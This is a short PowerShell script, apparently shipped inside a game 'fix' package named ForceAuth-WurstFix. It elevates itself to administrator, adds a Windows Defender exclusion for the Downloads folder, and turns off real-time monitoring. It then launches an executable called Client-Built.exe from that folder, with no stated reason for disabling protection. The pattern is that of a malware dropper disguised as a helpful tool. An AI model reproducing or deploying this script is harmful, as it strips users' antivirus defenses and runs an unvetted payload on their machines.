
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator

if (-not $principal.IsInRole($adminRole)) {
    # If not running as Administrator, relaunch the script as Administrator
    Write-Host "This script requires Administrator privileges. Restarting as Administrator..."
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $myinvocation.MyCommand.Definition" -Verb RunAs
    exit
}

# The script is running with Administrator privileges, proceed with the actions

PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '$env:USERPROFILE\Downloads'"
PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Wait for a few seconds to ensure previous actions are complete (optional)
Start-Sleep -Seconds 3

# Run "Client-Built.exe"
$exePath = "$env:USERPROFILE\Downloads\ForceAuth-WurstFix-main\ForceAuth-WurstFix-main\Client-Built.exe"

# Check if the file exists before attempting to run it
if (Test-Path $exePath) {
    Write-Host "Running Client-Built.exe..."
    Start-Process $exePath
} else {
    Write-Host "Client-Built.exe not found in Downloads folder."
}
